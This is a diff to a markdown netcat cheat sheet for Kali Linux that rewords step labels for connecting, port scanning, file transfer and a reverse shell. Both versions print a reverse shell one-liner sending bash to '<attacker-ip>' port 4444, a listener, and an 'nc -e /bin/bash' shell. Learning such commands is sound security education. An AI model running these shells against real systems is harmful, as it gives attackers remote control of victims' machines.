@@ -27,12 +27,12 @@ Recommended OS: Kali Linux
 - **Connect to host**:  `nc <hostname or IP> 1234`
 - **Scan for certain ports in a range**: `nc -zv <hostname> 1-100`
 - **Send file**:  
-  1. Receiver opens port and preps redirect:  `nc -l 12345 > received_file.txt`  
-  2. Sender connects and redirects file to receiver ip:  `nc <receiver_ip> 12345 < my_file.txt`
+  1. Receiver (opens port & prepares to save file):  `nc -l 12345 > received_file.txt`  
+  2. Sender (connects & sends file to receiver’s IP):  `nc <receiver_ip> 12345 < my_file.txt`
 - **Reverse Shell**:  
-  1. Attacker opens port:  `nc -lvp 4444`  
-  2. Victim connects and allows interactive shell for attacker:  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`
-  - Note: newer systems use `nc -l -p 1234 -e /bin/bash`  
+  1. Attacker (listens for connection)::  `nc -lvp 4444`  
+  2. Victim (connects & gives interactive shell to attacker):  `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1`
+  - Note: On some systems use `nc -l -p 1234 -e /bin/bash`  
 
 ---
 
